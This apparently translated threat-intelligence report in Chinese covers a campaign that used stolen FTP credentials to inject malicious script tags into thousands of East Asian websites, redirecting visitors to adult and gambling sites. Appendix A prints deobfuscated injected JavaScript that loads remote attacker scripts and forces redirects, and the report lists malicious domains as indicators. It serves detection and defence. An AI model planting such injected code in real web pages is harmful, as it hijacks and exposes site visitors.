> 自 2022 年 9 月上旬以来，数万个针对东亚用户的网站遭到黑客攻击，将数十万用户重定向到成人主题内容。

## 长话短说

在过去的几个月里，我们一直在调查利用通过未知威胁向量获得的合法 FTP 凭据的大规模网络操作。在许多情况下，这些是高度安全的自动生成的 FTP
凭据，黑客以某种方式获取并利用这些凭据进行网站劫持。

## 执行简介

自 2022 年 9
月上旬以来，一个未知的黑客已成功入侵数万个主要针对东亚用户的网站，将数十万用户重定向到成人主题内容。在每种情况下，黑客都将恶意代码注入到面向消费者的网页中，这些网页旨在收集有关访问者环境的信息，并偶尔将他们重定向到这些其他网站，具体取决于随机机会和用户所在的国家/地区.

被入侵的网站包括许多小公司网站和一些由跨国公司网站。它们在技术栈和托管服务方面各不相同，因此很难查明该黑客可能滥用的任何特定漏洞、配置错误或泄露凭据的来源。在一些情况下，包括我们为调查此活动而设置的蜜罐，黑客使用他们之前以某种方式获得的合法
`FTP`凭据连接到目标 `Web`服务器。

虽然我们无法确定这个黑客如何获得对受影响的 Web
服务器的初始访问权限，或者他们从哪里获取被盗凭据，但我们决定无论如何都要公布我们的调查结果，以便让更多人意识到这一持续不断的问题活动。鉴于目标网站的性质，我们认为黑客的动机很可能是经济动机，也许他们只想增加来自特定国家/地区的这些网站的流量，仅此而已。然而，对被入侵网站及其用户体验的影响等同于污染，并且该黑客利用任何弱点来获得对这些网站的初始访问权都可能被其他黑客利用来造成更大的伤害。

如果您通过 `FTP`维护您的网站，我们建议使用具有复杂用户名和密码组合的 `FTPS`或 `SFTP`。如果您在您的环境中发现任何与此活动相关的
`IOC`，您应该更换您的凭据，从可信来源重新安装软件，并将受损资产恢复到以前的干净版本。

> 请看下图， **涉及`Azure`云，亚马逊云，阿里云和`cloudflare`**

![图片](https://image.3001.net/images/20230502/1683017659_6450cfbb3e2d8991223a4.jpg!small)

## 介绍

2022 年 10 月上旬，作为我们与客户合作调查其云环境面临威胁的一部分，我们了解到几个在东亚地区托管的被入侵的 `Azure
Web`应用程序将用户重定向到成人网站。在上述每一种情况下，用于管理 `Web`应用程序的
`FTP`服务都被未知黑客使用合法凭据访问（长而复杂的密码，不太可能作为暴力字典攻击的一部分包含在内）。黑客修改了现有网页并添加了一行
`HTML`代码，其形式为引用远程 `JavaScript`脚本的脚本标签。在多个案例中，根据对相关 `FTP `日志的分析，黑客从静态 IP 地址
`172.81.104.64 `连接到这些 FTP 节点。

![图片](https://image.3001.net/images/20230502/1683017673_6450cfc9462c69f27cba9.jpg!small)

随着我们进一步调查，我们发现这些看似孤立的案例实际上是一组更大的活动的一部分，这些活动已成功入侵数千个网站，其中包括几个由大型跨国公司运营并针对东亚用户的网站。根据来自`publicwww`和`SimiliarWeb`的数据，我们建议在撰写本文时保守估计至少有
10,000 个受损网站（不包括子域），每月总共重定向数十万用户。这些网站在其底层技术和托管服务方面非常多样化，实际上只有一小部分是 `Azure
Web`应用程序。

鉴于重定向的方法和目标网站的性质，我们最初假设这是一个污染案例，但我们后来考虑了目标可能是广告欺诈、 SEO
操纵或可能只是将无机流量驱动到的可能性这些网站。我们没有观察到任何网络钓鱼、网络浏览或恶意软件感染的迹象，也尚未确定任何可以揭示黑客确切动机的证据。

我们得出的结论是，这项活动很可能始于 2022 年 9
月上旬（根据域名注册日期和受害者报告），涉及不断入侵网络服务器，收集有关其访问者的信息，有时只是将他们重定向到其他包含成人网站或赌博网站。

## 技术细节

黑客破坏的网站修改为包含多个 `JavaScript`标记之一（尽管在某些情况下恶意
`JavaScript`被直接注入服务器上的现有文件，如下所述）。考虑到静态注入内容和黑客使用
`FTP`直接在服务器上修改文件，这似乎排除了恶意广告作为攻击向量的可能性。

注入的脚本标签导致访问者下载并执行托管在黑客控制的服务器上的 `JavaScript`脚本，其
`URL`看起来类似于合法服务（例如`tpc.googlesyndication.wiki`伪装成合法服务`tpc.googlesyndication.com`）：

    
    
    <script type="text/javascript" src="https://tpc.googlesyndication.wiki/sodar/sodar2.js"></script>

这些修改似乎是自动进行的，因为我们已经确定了同一个网站包含多个标签的情况，这表明它不止一次被破坏（这对我们的研究很有用，因为它让我们能够发现新的变体）。此外，`JavaScript`标记几乎总是添加到`HTML`页面`<head>`部分的末尾或作为
`JavaScript`文件中的最后一行。我们还目睹了此过程中的错误，例如将标签添加到二进制文件（如视频）的末尾（。

我们还发现了一个`GitHub`项目似乎也受到了类似的破坏，其中一次提交将恶意
`JavaScript`标签的两个变体添加到各个页面。这可能意味着黑客一直在试图非法访问代码存储库，以感染任何相关网站。

恶意主机均以 `Cloudflare`为前端并进行地理位置限制，限制从东亚某些国家/地区连接的用户执行
`JavaScript`脚本。此外，该脚本使用一种常见的网络伪装技术，将访问者的用户代理和引荐来源网址与已知网络爬虫和搜索引擎（如 GoogleBot
或百度）列表相匹配，并忽略此类请求。然而，这并不能阻止这些网络爬虫对被入侵网站中添加的恶意代码行进行索引，这使我们更容易识别它们。

到目前为止，我们已经发现了许多评估为与此活动相关的服务器，每个服务器都托管上述 `JavaScript`脚本的变体，同时伪装成合法的
URL（通常通过更改顶级域）：

恶意网址| 合法网址  
---|---  
tpc.googlesyndication.wiki/sodar/sodar2.js|
tpc.googlesyndication.com/sodar/sodar2.js  
beacon-v2.helpscout.help/static/js/vendor.06c7227b.js|
beacon-v2.helpscout.net/static/js/vendor.06c7227b.js  
cdn.jsdelivr.autos/npm/jquery/dist/jquery.min.js|
cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js  
minjs.us/static/js/min.js| */static/js/min.js  
cdn-go.net/vasdev/web_webpersistance_v2/v1.8.2/flog.core.min.js| cdn-go.cn/vasdev/web_webpersistance_v2/v1.8.2/flog.core.min.js  
a.msstatic.net/main3/common/assets/template/head/ad.tmpl_a9b7.js|
a.msstatic.com/huya/main3/*  
  
虽然我们不能完全确定这些都是同一个活动集群的所有部分并由同一个黑客操作，但
`JavaScript`脚本的结构都相似，使用类似的混淆技术，并包含唯一可识别的字符串（明文或混淆），例如作为要忽略的爬虫列表（请参阅下一节）。此外，其中一些服务器
似乎正在运行 `NGINX`，并且一些域名是通过
`PorkBun`注册的。域`minjs.us`和域`metamarket.quest`的独特之处在于它们的原始 `IP`地址已在历史 DNS
记录中公开（`193.109.120.45`和`159.69.123.158`，分别基于私有被动 DNS 数据，但可公开验证）。后者一直活跃到 2023 年
2 月下旬，并且曾为`googlesyndication.wiki`提供过证书，证明了这些域之间的附加链接。

## 重定向脚本

`JavaScript`脚本的重定向逻辑显然会检查一组特定条件（随着时间的推移而改变），并且只有在满足这些条件的情况下才会将访问者重定向到目标网站。在最新的变体中（截至
2023 年 2 月），其中一些条件如下：

  1. 每个脚本变体都包含一个`probability`设置为 0 到 1 之间数字的字段。执行脚本时，会计算一个 0 到 1 之间的随机数，如果计算结果小于该值，则会在用户`probability`的机器设置为 24 小时后过期，然后用户将被重定向到该`srcAddress`字段中列出的目标网站。

  2. 如果用户的机器上已经设置了 `cookie`，那么当他们下次访问任何受相同变体破坏的网站时，他们会自动重定向到`srcAddress`字段中列出的目标网站，同时忽略该`probability`字段值。不同的脚本变体有时会为其 `cookie`使用不同的名称（观察到的示例包括`qwertvy`和`bdstatics`）。

  3. 有趣的是，如果用户使用的是 `Android`浏览器并且在脚本中启用了标志`config.androidApk`，那么不会将用户重定向到`srcAddress`字段中列出的网站，而是重定向到`downloadSrc`字段中列出的资源。在我们分析的样本中，这些要么`googleplay.com/chrome.apk`是要么`google.com/google.apk`（取决于变体）。请注意，这些资源实际上都不存在，而且我们从未见过启用`config.anrdoidApk`的变体。这可能表明这些只是占位符，它们的功能尚未完全实现。

  4. 如上所述，如果用户代理是已知网络爬虫的，或者引用者是已知搜索引擎的，则不会重定向用户（此功能分别在 `isSpider`和`searchEngine`函数中实现）。以下是脚本中包含的爬虫列表：

    
    
    bot|googlebot|crawler|spider|robot|crawling|Bytespider|Googlebot|Baiduspider|MSN Bot\/Bingbot|Yandex Bot|Soso Spider|Sosospider|Sogou Spider|360Spider|Yahoo! Slurp China|Yahoo!|YoudaoBot|YodaoBot|Sogou News Spider|msnbot|msnbot-media|bingbot|YisouSpider|ia_archiver|EasouSpider|JikeSpider|EtaoSpider|SemrushBot

我们推测`probability`字段的目的可能是为了负载平衡（以防止黑客的基础设施或目标网站过载），或者可能出于操作安全原因：因为重定向行为看起来不一致（与上述地理位置限制配合），它可能用户或网站管理员更难识别问题并查明原因（正如用户在公共论坛上争论特定网站是否被感染所证明的那样）。从理论上讲，这可能会增加
Web 服务器在较长时间内保持受损的机会。

![图片](https://image.3001.net/images/20230502/1683017716_6450cff4554e562f81435.png!small)

在过去的版本中，`JavaScript`脚本还收集了某些信息，这些信息显然是为了对访问者的浏览器进行指纹识别（`userAgent`,`host`,`referer`,`language`,`url`,`title`,`charset`,`OS`,`browser`,`resolution`,`typeReferer`,
`redirectUrl`）。此信息以 `Base64`编码并以 JSON 格式汇总（格式为`{"mydata":$data}`）。该脚本将使用
`POST`请求将 `JSON`上传到黑客控制的主机 (`/top/record/addRecord`) 上的
`API`节点。然后服务器将响应包含进一步指令的
`JSON`（格式为`{"code":$code,"msg":$message,"data":$data}`).
但是，在当前的一组脚本中并没有出现这种行为。从2022年12月开始，该脚本不再通过`POST`向服务器上传任何数据，并且删除了一些相关功能（较新的变体不再包括`detectOS`，`detectBrowser`，`getCurrentDate`，`getLanguage`、或`isPC`函数）。

除了添加或删除功能外，黑客还对恶意脚本进行了额外修改，其中一些似乎是为了响应检测。例如，托管在的脚本`metamarket.quest`经历了多次迭代，最初使用一种混淆方法，重定向概率为
`30%`（截至 2022 年 9 月），但后来切换到不同的混淆方法，并将概率降低到 `10%`（截至 2022 年 12
月）。有趣的是，目前托管的脚本的`helpscout.help`概率设置为 0%，这意味着目前没有用户被重定向到被入侵的网站。

值得注意的是，在此期间，与此活动相关的几个样本被上传到 `VirusTotal`，并被 `THOR APT Scanner
YARA`规则检测到，随后（2022 年 11 月下旬）威胁者改变了他们的 MO：在某些情况下，除了将
`JavaScript`标签添加到被入侵服务器上的现有文件后，他们开始直接将混淆的
`JavaScript`代码注入某些文件（我们在蜜罐上也观察到了这种行为）。我们评估这可能是因为某些 `THOR APT YARA`规则不扫描大于
100KB 的样本，但这很可能是巧合。

## 目的地网站

最初将用户重定向到的网站包括`alivod1.com`、`22332299.com`、`alibb1.xyz`和`alibb2.xyz`（阿里 BB /
阿里巴巴是“阿里巴巴”的中文简写）。重定向最初是直接执行的，但截至 2023 年 2
月，用户通过中间服务器重定向，然后将他们转发到似乎是动态生成的域名，例如`qs70qw11az.com`显示“`Alibbfb`”的品牌和各种赌博网站的广告，有时还会显示弹出窗口，提及使用“alibb”命名方案的网站。赌博网站会建议访问者下载一个
`APK`文件来安装一个 `Android`应用程序。

![图片](https://image.3001.net/images/20230502/1683017731_6450d0039ead198fcf74d.jpg!small)

## 中间服务器

如上所述，重定向过程随时间发生了变化。虽然被入侵网站的访问者最初是直接重定向的，但截至 2023 年 2
月，用户现在首先通过四个已知中间服务器之一重定向，这些中间服务器的 `URL`伪装成合法网站：

恶意网址| 合法网址  
---|---  
s3a.pstatp.org/toutiao/push.js| s3a.pstatp.com/toutiao/push.js  
stat.51sdk.org/（例如，stat.51sdk.org/b8nb3Ww5CtxpZis2）| stat.51sdk.com (?)  
tpc.cdn-linkedin.info/js/vendor.5b3ca61.js| *-cdn.linkedin.com（例如，mobile-cdn.linkedin.com）  
widget-v4.tidiochat.net/1_131_0/static/js/chunk-WidgetIframe-.js|
widget-v4.tidiochat.com/1_137_1/static/js/*  
  
然后，用户将被重定向到看似动态生成或随机命名的域，包括`qs70qw11az.com`,`rsoy6a1w7p.com`,`3h1yt68lxk.com`和`g7h69h29cx.com`。在撰写本文时，根据
`SimilarWeb`，最后一家在中国最受欢迎的网站排名第 2943，与美国的nespresso.com （排名第 2737）相当。

根据`SimiliarWeb`的数据，上述中间服务器每月处理数十万访问者——绝大多数来自东亚——并且一些活动在不同时期比其他活动更活跃，这可能与上述每个活动的“概率”字段：

![图片](https://image.3001.net/images/20230502/1683017743_6450d00fca49d533c3a7d.jpg!small)

## 受害者学

当我们试图确定被入侵网站之间的共同点时，我们发现绝大多数（但不是全部）满足以下标准：

  1. 要么在中国托管，要么在其他地方托管，但针对的是中国观众。

  2. 要么托管在具有开放 `FTP`端口 (`21`) 的服务器上，要么通过单独的 `FTP`节点部署。

我们已经确定了几个实例，其中被入侵网站的管理员注意到了入侵并在某些情况下删除了恶意重定向,
但它在不久之后又会重新出现。此外，我们发现其中一些被入侵网站的访问者报告说他们注意到他们被重定向到另一个网站（。此外，我们还发现了一台服务器，
显然是为了在几周内监控许多网站的感染迹象，这清楚地表明其他人也一直在调查这一活动。过去几个月在`VirusTotal`、`Weibu
Threatbook`和`urlscan.io`上扫描的大量相关样本也支持这一点。

我们已经阅读了一些声明，称此活动是通过利用前端开发软件百度 `UEditor`中的已知漏洞或宝塔（BT Panel）中的未知漏洞来推进的.
但是，我们认为这些本身并不能作为充分的解释。尽管如此，黑客很可能有多种方法可供使用，因此这些理论在某些特定情况或活动中可能适用。

## 蜜罐调查

在我们的调查过程中，我们设置了一个带有中国 IP 地址的蜜罐，上传了几个虚拟文件，并将其配置为允许任何 FTP 连接。从那以后，我们观察到黑客多次从上述
IP 地址 ( 172.81.104.64)
连接到它。我们没有看到黑客利用我们机器上的任何漏洞的迹象——相反，他们使用了与另一个不相关服务器关联的用户名和密码组合（这次尝试成功是因为我们将蜜罐配置为接受任何
FTP 连接）。根据历史 DNS 记录，这台服务器似乎之前托管在我们蜜罐的当前 IP 地址上。

一旦获得访问权限，他们便开始修改文件来包含恶意
`JavaScript`标记，并在后来的入侵中将脚本直接注入现有页面（如上所述）。这可能意味着在过去黑客获取了这台服务器的凭据并入侵了它，但我们无法证实这一点。还观察到他们使用看似来自普通暴力字典的通用用户名和密码组合连接到另一个蜜罐。

## 建议

如果您通过 `FTP`维护您的网站，我们建议使用具有强大用户名和密码组合的 `FTPS`或 `SFTP`。如果您在
`Web`服务器中发现任何妥协迹象（请参阅附录 B），我们建议您采取以下措施：

  1. 更换您用于维护受影响网站的任何凭据（例如 `FTP`和 `Git`密码）。

  2. 如果您通过 `FTP`维护您的网站，请切换到 `FTPS`或 `SFTP`

  3. 通过搜索已知的恶意域名（参见附录 B），识别网站各种资产中所有恶意 `JavaScript`标签/代码的实例。

  4. 从受信任的映像重新部署服务器，从受信任的来源重新安装软件，并修补到最新版本。

  5. 将受损资产恢复到不包含恶意 `JavaScript`标签/代码的先前干净版本，或手动删除标签/代码的所有实例。

## 开放式问题

  1. 黑客如何获得对目标 Web 服务器的初始访问权限？（即，他们首先如何为目标 Web 服务器获取合法的 FTP 凭据？）

  2. 作为此活动的一部分，用户被重定向到哪些其他网站？

  3. 为什么服务器地理限制在东亚？

  4. 拥有“`probability`”字段的目的是什么？（而不是重定向所有访问者）

  5. 是否存在发生重定向以外的行为的任何条件？（例如，下载额外的有效载荷）

## 概括

我们仍然不确定黑客是如何获得这么多网站的初始访问权限的，而且我们还没有确定受影响的服务器之间除了使用 FTP
之外的任何重要共同点。尽管鉴于攻击的复杂程度明显较低，黑客不太可能使用 0day
漏洞，但我们不能将其排除在外。也有可能我们只是忽略了一些共性，例如特定服务器端软件的错误配置或易受攻击的版本，或者可能是用于管理受影响网站的工具。黑客还可能利用密码窃取者的数据或利用泄露的凭据，如GoDaddy泄露，
尽管这不能完全解释服务器在密码更换后如何被重新感染。

尽管我们对这种威胁活动知之甚少，但我们还是决定公布我们的发现，以提高人们对这种持续活动的认识，并希望安全社区中的其他人能够识别初始访问向量。

鉴于目标网站的性质，我们认为黑客的动机很可能是经济动机，也许他们只想增加来自特定国家/地区的这些网站的流量，仅此而已。然而，对被入侵网站及其用户体验的影响等同于污染，并且该黑客利用任何弱点来获得对这些网站的初始访问权都可能被其他黑客利用来造成更大的伤害。与此同时，我们与
`Cloudflare`分享了我们的发现，并要求他们阻止这些重定向。

## 附录 A – 受害的 宝塔 服务器

整个 2022 年 12 月， 许多在`bt.cn`论坛的宝塔（BT
面板）用户报告说他们的网络服务器被黑客攻击并注入了代码，我们根据代码相似性和基础设施重叠将这些代码聚集到上述活动中。

宝塔已发布他们自己的分析并得出结论，与 `NGINX`相关的几个文件正在被修改以在被入侵的服务器上持久存在（正如 其他研究人员所证实的
那样），但他们无法确定初始访问向量，声称无法识别漏洞。因此，他们鼓励安全研究人员提交他们的漏洞赏金计划，并发布了一个扫描宝塔服务器以寻找感染迹象的脚本。

以下是从 `systemd-private-56d86f7d8382402517f3b5-jP37av`被入侵的 宝塔
服务器检索到的名为文件的两个不同样本的反混淆部分。请注意
`JavaScript`标记，一个用于`metamarket.quest`，另一个用于`msstatic.net`（这似乎是该活动子集所特有的，连同`cdn-go.net`）：

    
    
    function setc(_0x64d8x2, _0x64d8x3, _0x64d8x4) {  
    var _0x64d8x5 = new Date();  
    _0x64d8x5.setMinutes(_0x64d8x5.getMinutes() + _0x64d8x4);  
    document.cookie = _0x64d8x2 + '=' + _0x64d8x3 + ';expires=' + _0x64d8x5.toUTCString()  
    }  
    setc('waf_sc', '5889647726', 360);  
    document.write(unescape("%3Cscript src='https://a.msstatic.net/main3/common/assets/template/head/ad.tmpl_a9b7.js'%3E%3C/script%3E"));  
      
    function setc(_0x7338x2, _0x7338x3, _0x7338x4) {  
    var _0x7338x5 = new Date();  
    _0x7338x5.setMinutes(_0x7338x5.getMinutes() + _0x7338x4);  
    document.cookie = _0x7338x2 + '=' + _0x7338x3 + ';expires=' + _0x7338x5.toUTCString()  
    }  
    setc('waf_sc', '5889647726', 360);  
    document.write(unescape("%3Cscript src='https://www.metamarket.quest/market.js'%3E%3C/script%3E"));

以`waf_sc cookie`的值(`5889647726`) 为中心，我们确定了一些与其他域
(`yt67.shop`和`3kdv58xk.ibtoc3t7.com`)相关的`JavaScript`脚本样本。这些域之前已重定向到一个名为“`hyl.tv`”的成人网站`hyule64.com`，该网站显示的广告与我们在本次调查中观察到的其他目标网站上显示的广告类似。

这些其他脚本的结构与在被入侵的宝塔服务器上观察到的脚本类似，并且包含类似的功能，但它们并不完全相同。因此，这第三个活动子集可能是其他活动子集的分支，但我们对它们存在相关性的信心仍然很低。作为参考，这里是可能相关脚本之一的反混淆部分：

    
    
    function addiframe() {  
    var _0x22998d = document.createElement('a');  
    _0x22998d.href = 'https://3kdv58xk.ibtoc3t7.com';  
    _0x22998d.target = '_blank';  
    document.body.appendChild(_0x22998d);  
    _0x22998d.click();  
    setTimeout(() => document.body.removeChild(_0x22998d), 0x1f40);  
    }  
    function setcookie() {  
    var _0x3a43d1 = new Date();  
    _0x3a43d1.setTime(_0x3a43d1.getTime() + 0x18 * 0x3 * 0x3c * 0x3c * 0x3e8);  
    var _0x504815 = document.cookie.indexOf('waf_sc=5889647726');  
    if (_0x504815 < 0x0 && document.okk == null) {  
    document.okk = '123';  
    document.addEventListener('DOMContentLoaded', function (_0x301b98) {  
    if (document.kkffs == null) {  
    document.kkffs = '123';  
    var _0x5d8a65 = Math.floor(Math.random() * 0x64) + 0x1;  
    if (_0x5d8a65 <= 0x64) {  
    document.cookie = 'waf_sc=5889647726;expires=' + _0x3a43d1.toGMTString();  
    addiframe();  
    }  
    }  
    });  
    }  
    }  
    setcookie();

## 附录 B – 入侵指标 (IOC)

    
    
    tpc.googlesyndication.wiki/sodar/sodar2.js  
      
    beacon-v2.helpscout.help/static/js/vendor.06c7227b.js  
      
    cdn.jsdelivr.autos/npm/jquery/dist/jquery.min.js  
      
    www.metamarket.quest/market.js  
      
    minjs.us/static/js/min.js  
      
    cdn-go.net/vasdev/web_webpersistance_v2/v1.8.2/flog.core.min.js  
      
    a.msstatic.net/main3/common/assets/template/head/ad.tmpl_a9b7.js  
      
    s3a.pstatp.org/toutiao/push.js  
      
    stat.51sdk.org/*  
      
    tpc.cdn-linkedin.info/js/vendor.5b3ca61.js  
      
    widget-v4.tidiochat.net/*  
      
    */top/记录/addRecord  
      
    alibbvod.com  
      
    alivod1.com  
      
    alibb*.xyz  
      
    22332299.com  
      
    172.81.104.64  
      
    systemd-private-56d86f7d8382402517f3b5-jP37av  
      
    systemd-private-56d86f7d8382402517f3b51625789161d2cb-chronyd.service-jP37av

## 附录 C – 已知样本

    
    
    08d6092832ab0631cb45415707fe6e262a205d1809a064ed9aa577647a39ba8e (sodar2.js)  
      
    7259f39c86e94cf04b5843946e669e093955d37ca2e7ea1dd88fdd5d63698f61（sodar2.js，部分反混淆）  
      
    271a25666415ef308797072fbd710d8ddba82d181010182dedd1384bac0a5c3c（sodar2.js，部分反混淆）  
      
    50bf3385e888eee5e31a92d71c9a194b3bdfb62760b9cc069b962ef9d3b5646f (vendor.06c7227b.js)  
      
    ed7970300fa87fefdd991d68166cbd5ca6c3f5e0b90202a24c73bb048325ec62 (vendor.06c7227b.js)  
      
    6b5313f3ef4b260bebe59df8af4f1f1b7c112e0def8666d57e6033db381dea2c (vendor.06c7227b.js)  
      
    0a1cecea008b34bcbc8db9f4f56077a02492b3970cfe59fd8e96a08655c81cc2 (min.js)  
      
    952a70429797ca33ffc8d3344feec6c24ff4b72e03c01dbc0bd12967d5688fbb (min.js)  
      
    deb980b8dbce4914e4ce5f5b9c1245d5aef9dc58ba530b8b1f4a63d0669aee2d (min.js)  
      
    8ac547a78fb6a06aaac7562be6423362b4ac23e5dd89ab82819f2116688f76e8 (min.js)  
      
    c1049a0e6437f01007b2c4eeb2ce1bcfa4f2e1ece02bef617d3adb1b76b7fb1c（min.js，部分反混淆）  
      
    4770fdd231dccd6775a561fbf9c9dc16c0009aaea934107f5d7e9a79e10295d7 (market.js)  
      
    5e100ab9bfb7fea33e294f56ece82cfd50c8f5cce86aaacc6bd50f4c58ccaec7 (market.js)  
      
    7873091e8596080c441dd07dae1f6bb6486aa160e9f3fc728425ae3293420d62 (market.js)  
      
    30ec43c09bc09a4224001acb4af67126d5f2c58a2120c3e9f606c719ab6c826b (jquery.min.js)  
      
    76acbfd3312024f2c3046ead1c6da8d1bb832cb9e71fe74a4977f9e30067cfb3 (ad.tmpl_a9b7.js)  
      
    abdf025595c1e544d7a33432d4a8b2ed0a0170bc4d1657312396e14d277dc2d1（nginx 二进制文件）  
      
    a39970152a2d753c4fb449b15617820c72d02c3489f99155131f68376edc714e (systemd-private-56d86f7d8382402517f3b5-jP37av)﻿

